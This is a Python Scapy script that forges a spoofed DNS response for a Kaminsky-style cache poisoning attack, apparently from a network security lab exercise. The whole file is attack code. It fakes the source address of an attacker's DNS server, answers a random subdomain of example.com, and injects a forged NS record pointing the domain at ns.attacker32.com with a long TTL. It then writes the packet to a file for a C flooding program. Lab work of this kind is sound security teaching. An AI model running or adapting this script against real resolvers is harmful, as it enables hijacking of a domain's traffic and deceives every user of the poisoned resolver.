from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSRR, DNS, DNSQR



# Parameters
victim_dns_server = '199.43.135.53'     # Victim's DNS server IP 199.43.135.53 or 199.43.133.53
attacker_dns_server = '10.9.0.153'  # Attacker's DNS server IP

name = 'twysw.example.com'  # hostname used in attack
domain = "example.com"
ns = "ns.attacker32.com"

# Construct the DNS headers and payload
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)  # Create DNS answer
NSsec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
dns = DNS(id=0xAAAA,aa=1,rd=1,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Anssec,ns=NSsec)  # DNS response packet

# Construct the full packet (IP + UDP + DNS)
ip = IP(dst=victim_dns_server,src=attacker_dns_server)  # Attacker's DNS server ip -> Victim's DNS server ip
udp = UDP(dport=33333, sport=53,chksum=0)                           # UDP header
response = ip / udp / dns                               # Full response packet

# Save the packet to a file, which will be used in the C program
with open("ip_resp.bin", "wb") as f:
    f.write(bytes(response))
    response.show()

